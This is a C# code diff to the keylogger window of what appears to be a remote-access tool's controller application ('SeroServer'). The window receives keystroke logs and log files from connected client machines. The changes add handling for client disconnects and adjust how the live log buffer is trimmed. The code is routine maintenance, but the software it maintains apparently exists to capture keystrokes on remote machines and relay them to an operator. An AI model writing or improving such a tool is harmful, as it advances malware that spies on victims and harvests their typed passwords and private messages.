@@ -27,6 +27,7 @@ public partial class KeyloggerWindow : ThemedWindow
         _server.RegisterHandler(clientId, PacketType.KeyloggerLogsResult,  OnLogsResult);
         _server.RegisterHandler(clientId, PacketType.KeyloggerFilesResult, OnFilesResult);
         _server.RegisterHandler(clientId, PacketType.KeyloggerFileContent, OnFileContent);
+        _server.ClientDisconnected += OnClientDisconnected;
 
         _autoRefresh.Tick += (_, _) => { if (_capturing) RequestLogs(); };
         Lang.LanguageChanged += ApplyLanguage;
@@ -37,6 +38,7 @@ public partial class KeyloggerWindow : ThemedWindow
             _server.UnregisterHandler(clientId, PacketType.KeyloggerLogsResult);
             _server.UnregisterHandler(clientId, PacketType.KeyloggerFilesResult);
             _server.UnregisterHandler(clientId, PacketType.KeyloggerFileContent);
+            _server.ClientDisconnected -= OnClientDisconnected;
             Lang.LanguageChanged -= ApplyLanguage;
             ServerWindow.ReportGlobalActivity("Keylogger stopped", _clientId, "complete");
             ServerWindow.LogGlobal($"[KEYLOG] Keylogger stopped for client {_clientId}.");
@@ -108,8 +110,9 @@ public partial class KeyloggerWindow : ThemedWindow
                 {
                     NotificationService.NotifyKeylogReceived();
                     TxtLog.AppendText(data.Logs);
-                    if (TxtLog.Text.Length > 50000)
-                        TxtLog.Text = TxtLog.Text[^50000..];
+                    var full = TxtLog.Text;
+                    if (full.Length > 50000)
+                        TxtLog.Text = full[^50000..];
                     TxtLog.ScrollToEnd();
                     TxtViewerTitle.Text = $"Live buffer — {(_capturing ? "ON" : "OFF")}";
                 }
@@ -225,6 +228,18 @@ public partial class KeyloggerWindow : ThemedWindow
     }
 
     private void BtnSave_Click(object s, RoutedEventArgs e) => BtnDownload_Click(s, e);
+
+    private void OnClientDisconnected(SeroServer.Data.ConnectedClient c)
+    {
+        if (c.Id != _clientId) return;
+        Dispatcher.BeginInvoke(() =>
+        {
+            _autoRefresh.Stop();
+            _capturing = false;
+            UpdateBadge();
+            TxtStatus.Text = Lang.Get("PM_DISCONNECTED");
+        });
+    }
 
     private void UpdateBadge()
         => BadgeRunning.Visibility = _capturing ? Visibility.Visible : Visibility.Collapsed;
